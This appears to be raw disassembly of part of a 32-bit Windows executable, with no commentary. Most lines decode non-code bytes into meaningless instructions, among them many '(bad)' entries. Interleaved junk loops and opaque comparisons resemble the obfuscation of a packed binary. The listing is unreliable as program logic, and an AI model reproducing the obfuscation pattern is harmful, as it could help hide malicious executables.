  403bf3:	adc    dh,BYTE PTR [ecx]
  403bf5:	cmp    DWORD PTR [eax+0x3c9546eb],ebp
  403bfb:	aas    
  403bfc:	scas   al,BYTE PTR es:[edi]
  403bfd:	pop    ds
  403bfe:	fadd   QWORD PTR [esi+0x318c2808]
  403c04:	lock popf 
  403c06:	cdq    
  403c07:	out    dx,al
  403c08:	(bad)  
  403c09:	scas   al,BYTE PTR es:[edi]
  403c0a:	jg     0x403c75
  403c0c:	fdiv   st(3),st
  403c0e:	inc    edx
  403c0f:	mov    eax,ds:0x3a677b39
  403c14:	cmp    BYTE PTR [edx+0x77],bl
  403c17:	push   ebp
  403c18:	push   0x7c
  403c1a:	retf   
  403c1b:	loopne 0x403c5a
  403c1d:	adc    esp,ecx
  403c1f:	(bad)  
  403c20:	sahf   
  403c21:	mov    bl,0x98
  403c23:	(bad)  
  403c24:	and    edx,DWORD PTR [ebx+0x50]
  403c27:	ret    0x32df
  403c2a:	popf   
  403c2b:	ffree  st(2)
  403c2d:	popa   
  403c2e:	mov    cl,0xba
  403c30:	or     BYTE PTR [edi-0x7e44a96a],0x6a
  403c37:	(bad)  
  403c38:	mul    ebx
  403c3a:	outs   dx,DWORD PTR ds:[esi]
  403c3b:	stc    
  403c3c:	pop    edx
  403c3d:	adc    DWORD PTR [edi+ecx*8+0xa],ebx
  403c41:	sbb    DWORD PTR [ebp+0x508d5ba7],0xffffffff
  403c48:	mov    cl,BYTE PTR [ebp-0x44805df6]
  403c4e:	imul   esi,DWORD PTR [ecx-0x15ea0d2e],0xada15df3
  403c58:	sub    BYTE PTR [edi+0x2030d40c],bl
  403c5e:	popf   
  403c5f:	test   DWORD PTR [eax+0x5f182bae],0xc58433a0
  403c69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c6a:	ja     0x403c83
  403c6c:	mov    eax,ss:0xa2b90f91
  403c72:	xchg   edx,eax
  403c73:	jnp    0x403c8a
  403c75:	cwde   
  403c76:	je     0x403cc2
  403c78:	(bad)  
  403c79:	fcomp  DWORD PTR [edx]
  403c7b:	test   BYTE PTR [ebx-0x5c2a4d60],0xf1
  403c82:	rol    DWORD PTR [ecx],0x32
  403c85:	xchg   ebx,eax
  403c86:	or     ebp,DWORD PTR [esi+0x1be85fbf]
  403c8c:	mov    edi,0xf2a8bcb7
  403c91:	xor    ebp,DWORD PTR [ebp+0x5ccdbe18]
  403c97:	and    eax,0x48ef7383
  403c9c:	push   edx
  403c9d:	xor    al,0x4b
  403c9f:	into   
  403ca0:	cld    
  403ca1:	fwait
  403ca2:	retf   0x9a38
  403ca5:	mov    dh,bl
  403ca7:	adc    eax,0x1c5cdd75
  403cac:	out    dx,al
  403cad:	shr    BYTE PTR [esi+0xf],cl
  403cb0:	imul   esp,DWORD PTR [edi+0x1610ffe4],0xf44cf716
  403cba:	cmp    eax,DWORD PTR [eax+0x4d]
  403cbd:	dec    edi
  403cbe:	add    ebp,edx
  403cc0:	imul   ecx,DWORD PTR [ecx+0x3103d614],0x864eb8a3
  403cca:	mov    ds:0x9337c46a,eax
  403ccf:	in     al,0x4
  403cd1:	cmp    BYTE PTR [esi],cl
  403cd3:	call   0x4fae1930
  403cd8:	into   
  403cd9:	scas   al,BYTE PTR es:[edi]
  403cda:	jp     0x403c7f
  403cdc:	idiv   DWORD PTR [eax+0x3f10b1af]
  403ce2:	das    
  403ce3:	fild   DWORD PTR [ebx+edi*4-0x18b8b620]
  403cea:	repnz xchg edi,eax
  403cec:	aad    0xbf
  403cee:	out    0x90,eax
  403cf0:	icebp  
  403cf1:	jp     0x403ce0
  403cf3:	std    
  403cf4:	js     0x403ca5
  403cf6:	leave  
  403cf7:	clc    
  403cf8:	jnp    0x403cca
  403cfa:	fist   DWORD PTR [ebx]
  403cfc:	mov    esp,edi
  403cfe:	nop
  403cff:	sub    al,0x38
  403d01:	inc    ebx
  403d02:	imul   ebx,eax,0xfffffff1
  403d05:	jge    0x403d84
  403d07:	xor    al,0x24
  403d09:	lods   eax,DWORD PTR ds:[esi]
  403d0a:	xor    DWORD PTR [esi*8+0x634c0fa],esp
  403d11:	leave  
  403d12:	add    edx,ecx
  403d14:	and    DWORD PTR ds:0x41340e,0x0
  403d1e:	mov    ebx,DWORD PTR ds:0x41340e
  403d24:	inc    ebx
  403d25:	mov    DWORD PTR ds:0x41340e,ebx
  403d2b:	cmp    DWORD PTR ds:0x41340e,0x1a
  403d32:	jne    0x403d41
  403d38:	push   DWORD PTR [ebp-0xc]
  403d3b:	call   DWORD PTR ds:0x43c4ec
  403d41:	cmp    DWORD PTR ds:0x41340e,0x12
  403d48:	jb     0x403d1e
  403d4e:	add    ebx,DWORD PTR ds:0x43fbe4
  403d54:	imul   edx,edi
  403d57:	mov    edi,DWORD PTR [ebp-0x8]
  403d5a:	mov    ebx,DWORD PTR [ebp-0x10]
  403d5d:	sbb    DWORD PTR ds:0x4427b8,0x3f1a
  403d67:	sub    ebx,edi
  403d69:	cmp    ebx,edx
  403d6b:	ja     0x403d93
  403d71:	add    edx,DWORD PTR ds:0x4105cb
  403d77:	mov    edx,DWORD PTR [ebp-0x4]
  403d7a:	xor    edx,eax
  403d7c:	not    DWORD PTR ds:0x445364
  403d82:	add    edx,ecx
  403d84:	mov    DWORD PTR ds:0x445370,0x3a6f
  403d8e:	jmp    0x4047a2
  403d93:	movzx  ebx,WORD PTR ds:0x4427ac
  403d9a:	or     DWORD PTR ds:0x43fbe8,ebx
  403da0:	mov    edx,DWORD PTR [ebp-0x2c]
  403da3:	mov    DWORD PTR ds:0x43fbec,0x16
  403dad:	cmp    DWORD PTR ds:0x43fbec,0x0
  403db4:	je     0x403e6e
  403dba:	cmp    DWORD PTR ds:0x43fbec,0x20
  403dc1:	jne    0x403dd5
  403dc7:	push   DWORD PTR [ebp-0x18]
  403dca:	push   0x410629
  403dcf:	call   DWORD PTR ds:0x43c83c
  403dd5:	mov    ebx,DWORD PTR ds:0x43fbec
  403ddb:	dec    ebx
  403ddc:	mov    DWORD PTR ds:0x43fbec,ebx
  403de2:	jmp    0x403dad
  403de7:	and    DWORD PTR ds:0x41340a,0x0
  403df1:	jmp    0x403e03
  403df6:	mov    ebx,DWORD PTR ds:0x41340a
  403dfc:	inc    ebx
  403dfd:	mov    DWORD PTR ds:0x41340a,ebx
  403e03:	cmp    DWORD PTR ds:0x41340a,0x1c
  403e0a:	jae    0x403e6e
  403e10:	cmp    DWORD PTR ds:0x41340a,0xc
  403e17:	jne    0x403e4f
  403e1d:	push   DWORD PTR [ebp-0x10]
  403e20:	push   0x1816
  403e25:	push   DWORD PTR [ebp-0x28]
  403e28:	push   0x7e95
  403e2d:	push   0x4109
  403e32:	push   0x336d
  403e37:	push   0x1411
  403e3c:	push   DWORD PTR [ebp-0x20]
  403e3f:	push   0x7b8b
  403e44:	push   0x3268
  403e49:	call   DWORD PTR ds:0x43c5b8
  403e4f:	cmp    DWORD PTR ds:0x41340a,0xb
  403e56:	jne    0x403e69
  403e5c:	mov    ebx,DWORD PTR ds:0x41340a
  403e62:	inc    ebx
  403e63:	mov    DWORD PTR ds:0x41340a,ebx
  403e69:	jmp    0x403df6
  403e6e:	mov    edi,DWORD PTR [ebp-0x4]
  403e71:	xor    edx,eax
  403e73:	xor    edi,eax
  403e75:	add    edi,ecx
  403e77:	add    edx,ecx
  403e79:	imul   edx,edi
  403e7c:	mov    edi,DWORD PTR [ebp-0x8]
  403e7f:	mov    ebx,DWORD PTR [ebp-0x10]
  403e82:	sub    ebx,edi
  403e84:	cmp    ebx,edx
  403e86:	ja     0x403e94
  403e8c:	mov    edx,DWORD PTR [ebp-0x28]
  403e8f:	jmp    0x40462f
  403e94:	mov    edx,DWORD PTR [ebp-0x30]
  403e97:	mov    edi,DWORD PTR [ebp-0x4]
  403e9a:	jmp    0x403fff
  403e9f:	dec    ebp
  403ea0:	xchg   esp,eax
  403ea1:	(bad)  
  403ea2:	call   0xa99e390c
  403ea7:	sub    ah,ah
  403ea9:	adc    al,0xc3
  403eab:	stos   DWORD PTR es:[edi],eax
  403eac:	neg    al
  403eae:	lods   al,BYTE PTR ds:[esi]
  403eaf:	pop    esi
  403eb0:	sbb    DWORD PTR [esp+edi*2+0x34],edi
  403eb4:	jg     0x403f32
  403eb6:	jl     0x403eff
  403eb8:	popa   
  403eb9:	jg     0x403efa
  403ebb:	hlt    
  403ebc:	std    
  403ebd:	test   eax,0x7e85b413
  403ec2:	push   0x89a29923
  403ec7:	ja     0x403f19
  403ec9:	sbb    edi,ebp
  403ecb:	or     DWORD PTR [esi+edi*4],0x51f36890
  403ed2:	iret   
  403ed3:	out    0x3f,eax
  403ed5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ed6:	stos   BYTE PTR es:[edi],al
  403ed7:	sar    DWORD PTR [eax+0x69373072],1
  403edd:	std    
  403ede:	or     esi,edi
  403ee0:	ret    
  403ee1:	popa   
  403ee2:	test   al,0x26
  403ee4:	xlat   BYTE PTR cs:[ebx]
  403ee6:	jmp    0x52f5:0x4f83fe2f
  403eed:	arpl   bp,cx
  403eef:	push   ebx
  403ef0:	fs ss mov dh,0xc7
  403ef4:	popf   
  403ef5:	fdiv   QWORD PTR [ecx]
  403ef7:	xchg   esi,eax
  403ef8:	add    eax,0x5f1aee43
  403efd:	xchg   esi,eax
  403efe:	jnp    0x403f35
  403f00:	mov    al,ss:0x4dc9fe71
  403f06:	aaa    
  403f07:	cmp    DWORD PTR [edx+0x1de1cbc2],esi
  403f0d:	pushf  
  403f0e:	mov    ecx,DWORD PTR [edi+0xb]
  403f11:	fimul  DWORD PTR [edi+0xa33e2f]
  403f17:	das    
  403f18:	jnp    0x403f6d
  403f1a:	scas   al,BYTE PTR es:[edi]
  403f1b:	push   esp
  403f1c:	xchg   BYTE PTR [ecx-0x2b],ch
  403f1f:	sub    DWORD PTR ds:0x45b11346,eax
  403f25:	inc    edi
  403f26:	sub    BYTE PTR [edi-0x27],0xba
  403f2a:	enter  0xd022,0x31
  403f2e:	cmp    ebx,DWORD PTR [edi+0x7d]
  403f31:	jbe    0x403f24
  403f33:	or     dh,dh
  403f35:	ds mov dh,0xf1
  403f38:	sar    DWORD PTR [edx],1
  403f3a:	xor    eax,0x61988cc2
  403f3f:	xor    esi,DWORD PTR [ecx-0x614fc8a0]
  403f45:	not    BYTE PTR [eax+0xd]
  403f48:	mov    al,ds:0x1a850532
  403f4d:	btc    DWORD PTR [esi],edi
  403f50:	out    dx,eax
  403f51:	sahf   
  403f52:	in     al,0x1d
  403f54:	(bad)  
  403f55:	sbb    al,0x55
  403f57:	cmp    eax,0x7ae43fe8
  403f5c:	popf   
  403f5d:	retf   
  403f5e:	test   BYTE PTR [edi],ah
  403f60:	in     eax,0xd7
  403f62:	sbb    DWORD PTR [esi],edx
  403f64:	xor    dl,cl
  403f66:	sahf   
  403f67:	(bad)  
  403f68:	scas   eax,DWORD PTR es:[edi]
  403f69:	add    dh,BYTE PTR [esi-0x18d6e0b3]
  403f6f:	pop    es
  403f70:	(bad)  
  403f71:	in     al,dx
  403f72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f73:	ja     0x403fe6
  403f75:	xlat   BYTE PTR ds:[ebx]
  403f76:	mov    edi,0x7e6fd737
  403f7b:	xor    DWORD PTR [edx-0x5e],ecx
  403f7e:	push   ebp
  403f7f:	xor    dl,BYTE PTR [eax+0x492b17f2]
  403f85:	xchg   esp,eax
  403f86:	in     eax,dx
  403f87:	xor    esp,DWORD PTR [edi-0x46]
  403f8a:	sub    al,0xec
  403f8c:	dec    ecx
  403f8d:	fwait
  403f8e:	aaa    
  403f8f:	sbb    eax,0xc4c84462
  403f94:	jbe    0x403f99
  403f96:	adc    cl,BYTE PTR [edx-0x12]
  403f99:	or     eax,0x325ff2c3
  403f9e:	jns    0x403fda
  403fa0:	inc    edx
  403fa1:	ss (bad) 
  403fa3:	inc    ecx
  403fa4:	pop    es
  403fa5:	aad    0x83
  403fa7:	and    ebx,edi
  403fa9:	or     esp,DWORD PTR [ebx]
  403fab:	mov    edi,0xb5deb58c
  403fb0:	test   eax,0x43b716dc
  403fb5:	sbb    ch,BYTE PTR [edx-0x44]
  403fb8:	xchg   DWORD PTR [edi+0x38975e7f],ecx
  403fbe:	dec    ebx
  403fbf:	xchg   ecx,eax
  403fc0:	sub    eax,0x7e0c35dc
  403fc5:	fxch   st(5)
  403fc7:	mov    ebp,0x6f286142
  403fcc:	pop    ss
  403fcd:	dec    eax
  403fce:	sub    al,BYTE PTR ds:0x9446e91
  403fd4:	sub    eax,0x6dde1b9d
  403fd9:	push   esi
  403fda:	lods   eax,DWORD PTR ds:[esi]
  403fdb:	adc    edi,DWORD PTR [edi-0x5cd91bc2]
  403fe1:	je     0x403fc5
  403fe3:	repz mov cl,0xf8
  403fe6:	jo     0x40405d
  403fe8:	cmp    DWORD PTR [edi+0x71],ecx
  403feb:	mov    ah,0x4d
  403fed:	cmc    
  403fee:	int    0x82
  403ff0:	stos   DWORD PTR es:[edi],eax
  403ff1:	xchg   ebx,eax
  403ff2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ff3:	test   al,0xd8
  403ff5:	push   esi
  403ff6:	and    dl,ch
  403ff8:	inc    edi
  403ff9:	pushf  
  403ffa:	mov    WORD PTR [esi],ds
  403ffc:	mov    dl,0x67
  403ffe:	fnsave [ebx]
  404000:	shl    BYTE PTR [ebx],1
  404002:	clc    
  404003:	add    edi,ecx
  404005:	add    edx,ecx
  404007:	imul   edx,edi
  40400a:	mov    edi,DWORD PTR [ebp-0x8]
  40400d:	mov    ebx,DWORD PTR [ebp-0x10]
  404010:	sub    ebx,edi
  404012:	cmp    ebx,edx
  404014:	ja     0x404022
  40401a:	mov    edx,DWORD PTR [ebp-0x2c]
  40401d:	jmp    0x40462f
  404022:	mov    edx,DWORD PTR [ebp-0x34]
  404025:	mov    edi,DWORD PTR [ebp-0x4]
  404028:	xor    edx,eax
  40402a:	xor    edi,eax
  40402c:	add    edi,ecx
  40402e:	add    edx,ecx
  404030:	imul   edx,edi
  404033:	mov    edi,DWORD PTR [ebp-0x8]
  404036:	mov    ebx,DWORD PTR [ebp-0x10]
  404039:	sub    ebx,edi
  40403b:	cmp    ebx,edx
  40403d:	jmp    0x4041a2
  404042:	sbb    DWORD PTR [edx+ecx*2],esi
  404045:	cs pop ebp
  404047:	mov    ds:0xe1ed77d,al
  40404c:	cmovae ebp,DWORD PTR [ebx]
  40404f:	lock adc DWORD PTR [eax+0x16],esi
  404053:	sbb    edi,DWORD PTR [esp+edi*2+0x34]
  404057:	jg     0x4040d5
  404059:	jl     0x4040da
  40405b:	jle    0x404021
  40405d:	mov    edx,DWORD PTR [ebx-0x77]
  404060:	adc    eax,DWORD PTR [edx]
  404062:	out    dx,al
  404063:	or     BYTE PTR [edx],cl
  404065:	push   ds
  404066:	fdivrp st(5),st
  404068:	inc    edi
  404069:	je     0x403ff5
  40406b:	ins    DWORD PTR es:[edi],dx
  40406c:	lods   al,BYTE PTR ds:[esi]
  40406d:	inc    ebx
  40406e:	jbe    0x4040b1
  404070:	data16 xchg cl,bl
  404073:	mov    ecx,0x90822a26
  404078:	aad    0x3d
  40407a:	dec    esp
  40407b:	xor    ah,al
  40407d:	and    eax,0x8a455e07
  404082:	and    cl,BYTE PTR [ebx-0x15]
  404085:	push   0xffffffed
  404087:	and    dl,BYTE PTR [ecx-0x2f5292e0]
  40408d:	ss test al,0x2d
  404090:	les    esi,FWORD PTR [edx+ebx*8-0x69]
  404094:	pop    eax
  404095:	outs   dx,BYTE PTR ds:[esi]
  404096:	mov    eax,0xb14aaa02
  40409b:	push   es
  40409c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40409d:	sbb    esp,ebx
  40409f:	test   bh,0x47
  4040a2:	sub    al,0xb6
  4040a4:	jecxz  0x404062
  4040a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4040a7:	mov    eax,0xf0a20c61
  4040ac:	xlat   BYTE PTR ds:[ebx]
  4040ad:	mov    al,BYTE PTR [ecx-0x4d]
  4040b0:	or     DWORD PTR [ebx+0x34],ecx
  4040b3:	pusha  
  4040b4:	cmp    BYTE PTR [eax+0x12bcea04],bh
  4040ba:	leave  
  4040bb:	test   DWORD PTR [edx-0x34da39d5],ecx
  4040c1:	xchg   esi,eax
  4040c2:	ja     0x40406f
  4040c4:	shl    BYTE PTR [edi],1
  4040c6:	sub    DWORD PTR [ecx+ebp*8],ecx
  4040c9:	xor    al,0xcd
  4040cb:	outs   dx,DWORD PTR ds:[esi]
  4040cc:	fcomp  st(6)
  4040ce:	adc    bh,bh
  4040d0:	icebp  
  4040d1:	scas   al,BYTE PTR es:[edi]
  4040d2:	js     0x404075
  4040d4:	cmp    BYTE PTR [edx],al
  4040d6:	pop    ds
  4040d7:	bound  ecx,QWORD PTR [edi+0x9de70d1]
  4040dd:	inc    ecx
  4040de:	fwait
  4040df:	addr16 pushf 
  4040e1:	pop    eax
  4040e2:	jne    0x404128
  4040e4:	mov    eax,ds:0xe7065f76
  4040e9:	push   esp
  4040ea:	and    eax,0xe894f7a4
  4040ef:	bound  edi,QWORD PTR [esi+0x32]
  4040f2:	pop    ss
  4040f3:	pop    esp
  4040f4:	rol    DWORD PTR [ecx],0xf4
  4040f7:	sub    DWORD PTR [ebp+0xc],0xffffffe7
  4040fb:	cld    
  4040fc:	pusha  
  4040fd:	lahf   
  4040fe:	stos   DWORD PTR es:[edi],eax
  4040ff:	outs   dx,DWORD PTR ds:[esi]
  404100:	scas   al,BYTE PTR es:[edi]
  404101:	jmp    0x40415f
  404103:	pop    ss
  404104:	ins    BYTE PTR es:[edi],dx
  404105:	and    al,0xa4
  404107:	cmp    al,0xf
  404109:	push   0xa1f66f47
  40410e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40410f:	jmp    0x1fc:0x8d427781
  404116:	lods   eax,DWORD PTR ds:[esi]
  404117:	shr    DWORD PTR [ecx],cl
  404119:	xchg   BYTE PTR [ebx+edi*4+0x1c],ch
  40411d:	dec    edx
  40411e:	mov    ebx,0xfc2ac22c
  404123:	test   eax,0xae33763
  404128:	(bad)  
  404129:	xchg   DWORD PTR [edi+0x2d5e6b69],edx
  40412f:	jb     0x404191
  404131:	call   0xbd5a:0x311cdcc3
  404138:	iret   
  404139:	inc    DWORD PTR [edx*4-0x24a3d402]
  404140:	and    BYTE PTR [ebp-0x5e],dl
  404143:	sbb    al,0x50
  404145:	add    BYTE PTR ds:0x61198009,0x1d
  40414c:	add    ah,BYTE PTR [ebx+0x46]
  40414f:	lea    eax,[edx-0x1e]
  404152:	xor    edx,DWORD PTR ds:0xe2b17983
  404158:	test   BYTE PTR [edx-0x4c8e8115],0x1e
  40415f:	inc    esi
  404160:	in     eax,dx
  404161:	mov    bl,0xa5
  404163:	fldcw  WORD PTR [edx+eax*1-0x24]
  404167:	fs fs push edi
  40416a:	rcr    DWORD PTR [ecx+0x14],1
  40416d:	xchg   ebx,eax
  40416e:	and    BYTE PTR [ebp+0x4d],0xae
  404172:	int3   
  404173:	sbb    BYTE PTR [eax],0xad
  404176:	in     al,0xf6
  404178:	xchg   edx,eax
  404179:	js     0x4041cb
  40417b:	inc    BYTE PTR [ebp-0x32]
  40417e:	or     BYTE PTR [edi-0x7c11f1ac],bl
  404184:	sub    eax,0x7dccc534
  404189:	jecxz  0x4041b7
  40418b:	adc    eax,0x1ce3e5f7
  404190:	dec    esp
  404191:	push   cs
  404192:	adc    ebp,DWORD PTR [ecx+ebp*2-0x66]
  404196:	test   al,0xd8
  404198:	stos   BYTE PTR es:[edi],al
  404199:	jno    0x404134
  40419b:	push   es
  40419c:	mov    bh,BYTE PTR [esi+0x65561d71]
  4041a2:	ja     0x4041b0
  4041a8:	mov    edx,DWORD PTR [ebp-0x30]
  4041ab:	jmp    0x40462f
  4041b0:	mov    edx,DWORD PTR [ebp-0x38]
  4041b3:	mov    edi,DWORD PTR [ebp-0x4]
  4041b6:	xor    edx,eax
  4041b8:	xor    edi,eax
  4041ba:	jmp    0x40431f
  4041bf:	dec    ecx
  4041c0:	inc    ebx
  4041c1:	fdivr  st,st(0)
  4041c3:	fidivr DWORD PTR [ebx+0x69]
  4041c6:	gs jge 0x40418a
  4041c9:	shr    ebx,cl
  4041cb:	(bad)  
  4041cc:	dec    ecx
  4041cd:	mov    ds:0x7c1aeebb,eax
  4041d2:	jl     0x404208
  4041d4:	jg     0x404252
  4041d6:	jl     0x40417d
  4041d8:	xchg   ecx,eax
  4041d9:	inc    edi
  4041da:	repnz into 
  4041dc:	lods   al,BYTE PTR ds:[esi]
  4041dd:	adc    esi,DWORD PTR ds:0xd6add7a2
  4041e3:	shr    BYTE PTR [edi+ebx*8+0x52],0x4d
  4041e8:	inc    edi
  4041e9:	add    al,0x5b
  4041eb:	jno    0x4041bf
  4041ed:	pop    edx
  4041ee:	ins    DWORD PTR es:[edi],dx
  4041ef:	sar    DWORD PTR [ecx+0x13],0xf
  4041f3:	call   0x20801236
  4041f8:	js     0x40421b
  4041fa:	and    esp,DWORD PTR [eax-0x6a]
  4041fd:	sbb    DWORD PTR [esi],ebp
  4041ff:	addr16 xchg ebp,eax
  404201:	int    0xcd
  404203:	out    dx,al
  404204:	jecxz  0x404191
  404206:	push   cs
  404207:	sbb    eax,0xb5e79446
  40420c:	js     0x4041c2
  40420e:	ins    DWORD PTR es:[edi],dx
  40420f:	mov    esi,0xb26866ff
  404214:	shl    BYTE PTR [edx+eax*4-0x18],cl
  404218:	cmc    
  404219:	add    al,0x6b
  40421b:	ja     0x4041a8
  40421d:	bound  esi,QWORD PTR [edx+0x29]
  404220:	adc    BYTE PTR [ebp+ecx*8-0x24dc41da],bl
  404227:	out    0xdc,eax
  404229:	jle    0x404235
  40422b:	mov    edi,0x3c5cda1
  404230:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404231:	push   ds
  404232:	stos   DWORD PTR es:[edi],eax
  404233:	fistp  QWORD PTR fs:[edi-0x52b2a470]
  40423a:	iret   
  40423b:	xor    ebp,esp
  40423d:	sub    BYTE PTR [ecx],bh
  40423f:	pop    eax
  404240:	ret    
  404241:	mov    ?,edx
  404243:	call   0xaeca:0x26e61422
  40424a:	int3   
  40424b:	(bad)  
  40424c:	sbb    eax,0x6fa1fc91
  404251:	cli    
  404252:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404253:	(bad)  [ebx+ecx*2-0x2360b055]
  40425a:	icebp  
  40425b:	pop    esp
  40425c:	ins    DWORD PTR es:[edi],dx
  40425d:	pusha  
  40425e:	jg     0x40420b
  404260:	imul   eax,DWORD PTR [eax+0x1b],0x22736cb1
  404267:	pop    ss
  404268:	mov    al,0x52
  40426a:	jmp    0xfff3:0xde894d51
  404271:	data16 jne 0x404280
  404274:	mov    esi,0xcb8bc8f0
  404279:	cmp    dh,bl
  40427b:	jp     0x4042ec
  40427d:	xlat   BYTE PTR ds:[ebx]
  40427e:	addr16 push edi
  404280:	mov    edx,0x1041fc8d
  404285:	test   eax,0x2c118f78
  40428a:	loop   0x40423c
  40428c:	icebp  
  40428d:	xchg   DWORD PTR [edx],esi
  40428f:	and    BYTE PTR [ebx+0x23cbf134],ah
  404295:	xor    BYTE PTR [esi],ah
  404297:	out    0xad,eax
  404299:	mov    BYTE PTR [ebx-0x1f7e92a2],dh
  40429f:	fld    QWORD PTR [eax+0x45]
  4042a2:	add    edi,DWORD PTR [ebx-0x6a58688a]
  4042a8:	mov    edi,0xa6dd7383
  4042ad:	(bad)  
  4042ae:	loop   0x40423b
  4042b0:	sub    ebx,edi
  4042b2:	jp     0x404260
  4042b4:	inc    ebp
  4042b5:	test   eax,0x158cb32d
  4042ba:	rol    BYTE PTR [ecx-0x5e],1
  4042bd:	bound  ecx,QWORD PTR [edx+eax*8-0x7a743d91]
  4042c4:	mov    cl,0x31
  4042c6:	push   0xffffff8d
  4042c8:	test   ecx,ebp
  4042ca:	rol    DWORD PTR [eax],1
  4042cc:	popa   
  4042cd:	lods   al,BYTE PTR ds:[esi]
  4042ce:	pop    edi
  4042cf:	and    edi,DWORD PTR [eax+0x66]
  4042d2:	fs enter 0x1f76,0xa5
  4042d7:	cmp    eax,0xaabd3291
  4042dc:	cmc    
  4042dd:	xor    ecx,DWORD PTR [edi-0x10d6a070]
  4042e3:	mov    bh,0xb4
  4042e5:	or     bl,ch
  4042e7:	mov    cs,WORD PTR es:[ebp+0x76fb487a]
  4042ee:	pop    esi
  4042ef:	or     cl,BYTE PTR [esi-0x45]
  4042f2:	mov    esp,esi
  4042f4:	loopne 0x4042fb
  4042f6:	shl    DWORD PTR [ecx*2-0x45932386],cl
  4042fd:	inc    esi
  4042fe:	mov    bl,0x9f
  404300:	leave  
  404301:	mov    edi,0xc06ff88f
  404306:	mov    ss,WORD PTR [esi+0x117a65cf]
  40430c:	cli    
  40430d:	(bad)  [ecx-0x7af6d1b4]
  404313:	ficom  DWORD PTR [eax+0x25]
  404316:	jmp    0x2ef6:0x79fb6cf3
  40431d:	sbb    al,cl
  40431f:	add    edi,ecx
  404321:	add    edx,ecx
  404323:	imul   edx,edi
  404326:	mov    edi,DWORD PTR [ebp-0x8]
  404329:	jmp    0x40448e
  40432e:	fwait
  40432f:	bound  esp,QWORD PTR [edi]
  404331:	pushf  
  404332:	stc    
  404333:	ins    DWORD PTR es:[edi],dx
  404334:	fwait
  404335:	jge    0x4042bf
  404337:	les    ecx,FWORD PTR [ebp+0x29]
  40433a:	fild   DWORD PTR [edx+0x2d]
  40433d:	shl    BYTE PTR [esi+0x347c7c1d],cl
  404343:	jg     0x4043c1
  404345:	jl     0x404359
  404347:	je     0x40433e
  404349:	(bad)  
  40434b:	out    0x4,al
  40434d:	pop    edx
  40434e:	and    eax,eax
  404350:	mov    eax,0x712c292c
  404355:	cs adc eax,0xc2cf6307
  40435b:	sbb    ecx,DWORD PTR [ecx+edx*8]
  40435e:	popf   
  40435f:	out    0xf3,eax
  404361:	mov    eax,DWORD PTR ds:0xc1f4f84e
  404367:	stos   DWORD PTR es:[edi],eax
  404368:	pusha  
  404369:	jmp    0x4744:0xcc382be2
  404370:	adc    eax,0xcedb7a25
  404375:	jno    0x404319
  404377:	fstp   TBYTE PTR [esi+0x3af6ce94]
  40437d:	cld    
  40437e:	sub    al,0x10
  404380:	fisttp QWORD PTR [edx+0x58]
  404383:	pop    ss
  404384:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404385:	xor    ah,BYTE PTR ds:0x57642136
  40438b:	jne    0x4043cb
  40438d:	xchg   ebp,eax
  40438e:	jg     0x4043d1
  404390:	pop    es
  404391:	adc    eax,0x9183746e
  404396:	into   
  404397:	jnp    0x4043c8
  404399:	jmp    0xa65f:0x1b956da6
  4043a0:	in     al,0xc7
  4043a2:	mov    eax,ds:0x6070da5d
  4043a7:	mul    ebx
  4043a9:	arpl   WORD PTR [ecx+0x65],si
  4043ac:	out    dx,al
  4043ad:	cdq    
  4043ae:	in     eax,0x8b
  4043b0:	and    dh,cl
  4043b2:	cld    
  4043b3:	xor    DWORD PTR [ebx+0x76],esp
  4043b6:	mov    esi,0xff9570ad
  4043bb:	pop    esp
  4043bc:	and    DWORD PTR [ecx+0x36b5efce],ebx
  4043c2:	in     al,dx
  4043c3:	rcr    BYTE PTR [ebp-0x38fc0556],cl
  4043c9:	pop    ebx
  4043ca:	lock jmp DWORD PTR [eax-0x65]
  4043ce:	mov    ds:0x76c281a8,eax
  4043d3:	push   ebx
  4043d4:	aaa    
  4043d5:	or     ebp,DWORD PTR ds:0x42a2ef9c
  4043db:	jge    0x40444f
  4043dd:	jge    0x40444b
  4043df:	imul   edx,DWORD PTR [esp+esi*8+0x2b2ff75a],0x25
  4043e7:	adc    eax,ebx
  4043e9:	sbb    al,0x8c
  4043eb:	xchg   edx,eax
  4043ec:	add    eax,0x3f8136a8
  4043f1:	add    dh,BYTE PTR [ecx+0x4dafe9b2]
  4043f7:	push   ds
  4043f8:	repz sub eax,0xf5f2bc63
  4043fe:	dec    ebx
  4043ff:	jb     0x4043c6
  404401:	or     al,0x91
  404403:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404404:	add    BYTE PTR [esp+ebx*1+0xf],bh
  404408:	inc    edi
  404409:	cmc    
  40440a:	push   esi
  40440b:	ss call 0xce24:0x77e25415
  404413:	in     al,dx
  404414:	std    
  404415:	and    dh,bh
  404417:	adc    ebp,DWORD PTR [edi]
  404419:	cwde   
  40441a:	and    dl,ch
  40441c:	cmp    DWORD PTR [edi],ecx
  40441e:	adc    BYTE PTR [edi-0x5c933a5a],ch
  404424:	scas   eax,DWORD PTR es:[edi]
  404425:	sub    eax,0x4cd8eb34
  40442a:	icebp  
  40442b:	out    0xd2,al
  40442d:	ja     0x40448b
  40442f:	or     al,0x8d
  404431:	aas    
  404432:	mov    DWORD PTR [esi+eiz*8],esp
  404435:	push   es
  404436:	cmp    DWORD PTR [esi],ecx
  404438:	add    al,0x7c
  40443a:	push   0xf675afc
  40443f:	sbb    eax,0xa5ba2544
  404444:	in     al,dx
  404445:	xor    eax,edx
  404447:	or     dh,dh
  404449:	dec    ebp
  40444a:	faddp  st(0),st
  40444c:	jmp    0x40449f
  40444e:	stc    
  40444f:	das    
  404450:	push   edx
  404451:	test   al,0x91
  404453:	xchg   BYTE PTR [ebx],bh
  404455:	jae    0x4044a2
  404457:	pushf  
  404458:	into   
  404459:	ror    DWORD PTR [ecx],cl
  40445b:	push   eax
  40445c:	sub    al,0x16
  40445e:	sti    
  40445f:	(bad)  
  404460:	pop    edx
  404461:	xor    DWORD PTR [ecx-0x75],ebp
  404464:	in     al,0x46
